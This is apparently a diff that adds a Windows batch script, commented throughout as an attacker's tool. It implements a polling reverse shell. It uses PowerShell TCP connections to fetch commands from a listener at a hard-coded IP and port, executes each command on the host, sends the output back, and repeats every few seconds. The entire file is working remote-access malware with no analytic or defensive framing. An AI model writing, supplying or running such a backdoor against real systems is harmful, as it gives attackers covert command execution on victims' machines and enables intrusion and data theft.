@@ -1,0 +1,36 @@
+@echo off
+setlocal EnableDelayedExpansion
+
+REM Set the attacker's IP and port where netcat listener is running
+SET IPADDRESS=10.211.55.11
+SET PORT=80
+SET DELAY=5
+
+:START
+    REM Fetch the command from the attacker's listener using PowerShell
+    FOR /F "tokens=* delims=" %%I IN ('powershell -Command "$tcpClient = New-Object System.Net.Sockets.TcpClient(\'!IPADDRESS!\',!PORT!); $stream = $tcpClient.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $command = $reader.ReadLine(); $tcpClient.Close(); $command"') DO (SET COMMAND=%%I)
+
+    REM If no command is received, go back to start and try again
+    IF [!COMMAND!]==[] (GOTO BACK) ELSE (GOTO SendTheCommand)
+
+:SendTheCommand
+    REM Clear the previous output
+    SET "OUTPUT="
+    
+    REM Execute the command and store the result in the OUTPUT variable
+    FOR /F "delims=" %%F in ('!COMMAND!') do (
+        if defined OUTPUT set "OUTPUT=!OUTPUT!~"
+        set "OUTPUT=!OUTPUT!%%F"
+    )
+    
+    REM Send the output back to the attacker's listener using PowerShell
+    powershell -Command "$tcpClient = New-Object System.Net.Sockets.TcpClient(\'!IPADDRESS!\',!PORT!); $stream = $tcpClient.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine(\'!OUTPUT!\'); $writer.Flush(); $tcpClient.Close()"
+
+:BACK
+    REM Reset variables and wait for the next command
+    SET "COMMAND="
+    SET "OUTPUT="
+    timeout !DELAY! /nobreak
+    GOTO START
+
+endlocal
